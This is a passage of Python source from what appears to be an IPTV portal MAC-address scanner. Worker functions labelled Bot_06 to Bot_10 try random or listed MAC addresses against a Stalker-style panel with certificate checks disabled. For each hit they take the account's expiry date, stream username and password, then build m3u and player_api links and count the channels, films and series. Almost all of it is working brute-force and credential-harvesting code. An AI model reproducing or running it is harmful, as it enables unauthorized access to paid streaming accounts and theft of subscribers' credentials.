                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))
                                                                                        
                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

def d6():
        global hitc
        global hitr
        global tokenr
        for mac in range(6,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_06"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))

                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

def d7():
        global hitc
        global hitr
        global tokenr
        for mac in range(7,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_07"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))

                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

def d8():
        global hitc
        global hitr
        global tokenr
        for mac in range(8,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_08"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))

                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

def d9():
        global hitc
        global hitr
        global tokenr
        for mac in range(9,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_09"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))

                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

def d10():
        global hitc
        global hitr
        global tokenr
        for mac in range(10,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_10"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))

                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
